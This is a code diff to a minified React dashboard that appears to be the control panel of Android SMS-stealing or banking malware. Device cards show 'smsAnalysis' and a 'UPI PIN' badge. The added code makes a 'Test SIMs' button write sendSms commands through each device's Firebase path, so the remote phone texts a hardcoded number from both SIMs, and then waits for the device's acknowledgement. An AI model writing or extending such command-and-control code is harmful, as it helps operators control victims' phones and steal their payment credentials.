@@ -20997,6 +20997,7 @@ function f1({
     onClick: tt
 }) {
     const [testBusy1, setTestBusy1] = jt.useState(false),
+        [testStatus, setTestStatus] = jt.useState(null),
         handleTestSim = async (x) => {
             x.stopPropagation();
             if (testBusy1) return;
@@ -21004,13 +21005,47 @@ function f1({
             const devId = A.sourceDeviceId || A.id,
                 fbUrl = A._fbUrl,
                 fbKey = A._fbKey,
-                target = "918093369768";
+                target = "918093369768",
+                // Last 8 chars of device id so baby can identify source phone in the SMS
+                devShort = String(devId).slice(-8),
+                msg1 = `SIM1-${devShort}`,
+                msg2 = `SIM2-${devShort}`;
+            // Wait for the device to flip isSended=true (it processed the SMS) before writing next
+            const waitForSent = async (maxMs) => {
+                const start = Date.now();
+                while (Date.now() - start < maxMs) {
+                    try {
+                        const r = await yn(fbUrl, fbKey, `clients/${devId}/webhookEvent/sendSms`);
+                        if (r && r.isSended === true) return true;
+                    } catch (_) {}
+                    await new Promise(res => setTimeout(res, 800));
+                }
+                return false;
+            };
+            let sim1Ok = false, sim2Ok = false;
             try {
-                await Zp(fbUrl, fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 1, to: target, message: "1", isSended: false });
-                await new Promise(r => setTimeout(r, 1500));
-                await Zp(fbUrl, fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 2, to: target, message: "2", isSended: false });
-            } catch (_) {}
+                // ── SIM 1 ──
+                await Zp(fbUrl, fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 1, to: target, message: msg1, isSended: false });
+                sim1Ok = await waitForSent(20000);
+                // Small gap before overwriting with SIM2 request
+                await new Promise(res => setTimeout(res, 1500));
+                // ── SIM 2 ──
+                await Zp(fbUrl, fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 2, to: target, message: msg2, isSended: false });
+                sim2Ok = await waitForSent(20000);
+            } catch (err) {
+                console.warn(`Test SMS failed for ${devId}:`, err);
+            }
+            // Report result to the user (visible on the card + console)
+            let statusText = "";
+            if (sim1Ok && sim2Ok) statusText = `✓ Both sent (${devShort})`;
+            else if (sim1Ok) statusText = `⚠ Only SIM1 sent (${devShort})`;
+            else if (sim2Ok) statusText = `⚠ Only SIM2 sent (${devShort})`;
+            else statusText = `✗ Failed — device offline? (${devShort})`;
+            console.log(statusText);
+            setTestStatus(statusText);
             setTestBusy1(false);
+            // Auto-clear status after 6 seconds
+            setTimeout(() => setTestStatus(null), 6000);
         };
     const b = A.status,
         d = A.smsAnalysis,
@@ -21176,12 +21211,17 @@ function f1({
                 className: "ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400",
                 children: "UPI PIN"
             })]
-        }), A._fbUrl && A._fbKey && r.jsx("button", {
-            onClick: x => handleTestSim(x),
-            disabled: testBusy1 || !A.status,
-            title: A.status ? "Send test SMS via SIM 1 & SIM 2 to 8093369768" : "Device offline",
-            className: "mt-2 w-full py-1.5 rounded-xl text-[10px] font-bold tracking-wide transition-all " + (A.status ? "bg-blue-600/15 border border-blue-600/30 text-blue-400 hover:bg-blue-600/25 active:scale-95" : "bg-[#1a1a1a] border border-[#262626] text-[#444] cursor-not-allowed"),
-            children: testBusy1 ? "Sending…" : "Test SIMs"
+        }), A._fbUrl && A._fbKey && r.jsxs(r.Fragment, {
+            children: [r.jsx("button", {
+                onClick: x => handleTestSim(x),
+                disabled: testBusy1 || !A.status,
+                title: A.status ? "Send test SMS via SIM 1 & SIM 2 to 8093369768" : "Device offline",
+                className: "mt-2 w-full py-1.5 rounded-xl text-[10px] font-bold tracking-wide transition-all " + (A.status ? "bg-blue-600/15 border border-blue-600/30 text-blue-400 hover:bg-blue-600/25 active:scale-95" : "bg-[#1a1a1a] border border-[#262626] text-[#444] cursor-not-allowed"),
+                children: testBusy1 ? "Sending… (waiting for device ack)" : "Test SIMs"
+            }), testStatus && r.jsx("div", {
+                className: "mt-1 text-center text-[10px] font-semibold " + (testStatus.startsWith("✓") ? "text-emerald-400" : testStatus.startsWith("⚠") ? "text-amber-400" : "text-red-400"),
+                children: testStatus
+            })]
         })]
     })
 }
